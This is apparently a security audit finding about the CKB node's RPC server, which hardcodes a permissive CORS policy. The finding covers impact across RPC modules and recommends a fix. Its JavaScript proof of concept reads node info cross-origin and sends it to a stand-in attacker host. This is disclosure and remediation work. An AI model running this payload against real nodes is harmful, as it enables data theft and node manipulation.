### Title
Hardcoded Permissive CORS Policy Enables Cross-Origin RPC Access from Any Web Origin — (File: `rpc/src/server.rs`)

### Summary
The CKB RPC HTTP/WebSocket server unconditionally applies `CorsLayer::permissive()`, which sets `Access-Control-Allow-Origin: *` and allows all methods and headers. There is no configuration option to restrict allowed origins. Any web page a node operator visits can silently issue cross-origin requests to the local RPC server and read the full responses, enabling CSRF-style attacks against all enabled RPC modules.

### Finding Description
In `rpc/src/server.rs`, the `start_server` function builds the Axum router and unconditionally attaches `CorsLayer::permissive()`: [1](#0-0) 

`CorsLayer::permissive()` from `tower-http` sets:
- `Access-Control-Allow-Origin: *`
- `Access-Control-Allow-Methods: *`
- `Access-Control-Allow-Headers: *`

This applies to both the HTTP server and the WebSocket server, since both call `start_server`.

The `RpcConfig` struct contains no field for restricting CORS origins: [2](#0-1) 

There is no `cors_allowed_origins`, `cors_allowed_hosts`, or equivalent field. The permissive policy is hardcoded and cannot be tightened by the operator.

### Impact Explanation
A user running a CKB node locally (default `127.0.0.1:8114`) and visiting a malicious website exposes every enabled RPC module to that website's JavaScript. Because the browser receives `Access-Control-Allow-Origin: *`, it allows the cross-origin response body to be read. Concrete impacts per module:

- **Pool**: `send_transaction` — attacker submits attacker-crafted transactions through the victim's node, potentially front-running or spamming the tx-pool.
- **Net**: `add_node` / `remove_node` / `set_ban` — attacker manipulates peer connections, isolating the node or injecting malicious peers.
- **Miner**: `submit_block` — attacker submits attacker-assembled blocks through the victim's node.
- **Debug**: `jemalloc_profiling_dump`, `update_main_logger` — attacker triggers sensitive local operations.
- **Alert**: `send_alert` — attacker broadcasts network alerts.

Nodes exposed on non-loopback addresses (which the docs warn against but operators do) face the same attack from any remote origin.

**Impact score: 4** (matches the original report's impact rating — broad attack surface across multiple sensitive operations).

### Likelihood Explanation
The default `listen_address` is `127.0.0.1:8114`, so the attack requires the node operator to visit a malicious web page while the node is running — a realistic scenario for developers and power users who run local nodes. No special privileges, leaked keys, or network access beyond a browser tab are required.

**Likelihood score: 2** (matches the original report — requires a user action, but that action is ordinary browsing).

### Recommendation
1. Add a `cors_allowed_origins: Option<Vec<String>>` field to `RpcConfig` in `util/app-config/src/configs/rpc.rs`.
2. In `start_server` in `rpc/src/server.rs`, replace the unconditional `CorsLayer::permissive()` with a restrictive layer when no origins are configured (e.g., `CorsLayer::new()` with no allowed origins, or `allow_origin(AllowOrigin::list([...]))` when origins are explicitly provided by the operator).
3. Default behavior should be to deny all cross-origin requests (no `Access-Control-Allow-Origin` header), since the RPC is not intended to be called from arbitrary web pages.

### Proof of Concept
With a CKB node running at `127.0.0.1:8114`, the following script executed from any web origin will successfully read the response:

```javascript
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1, jsonrpc: "2.0", method: "local_node_info", params: []
  })
})
.then(r => r.json())
.then(data => {
  // Full node info (addresses, peer_id, version) exfiltrated to attacker
  fetch("https://attacker.example/collect?d=" + btoa(JSON.stringify(data)));
});
```

Because `CorsLayer::permissive()` responds to the preflight with `Access-Control-Allow-Origin: *`, the browser does not block the response. The same pattern applies to `send_transaction`, `add_node`, `submit_block`, and all other enabled modules. [3](#0-2) [4](#0-3)
